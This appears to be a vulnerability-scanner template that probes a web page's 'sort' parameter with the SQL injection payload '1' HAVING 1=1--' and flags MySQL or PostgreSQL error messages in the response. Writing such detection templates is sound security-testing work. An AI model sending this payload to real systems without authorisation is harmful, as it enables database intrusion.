id: sqli3-having-24
name: 'HAVING/GROUP injection in sort'
severity: high
type: active
tags:
  - sqli
  - injection
description: 'Triggers DB error via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - '1'' HAVING 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
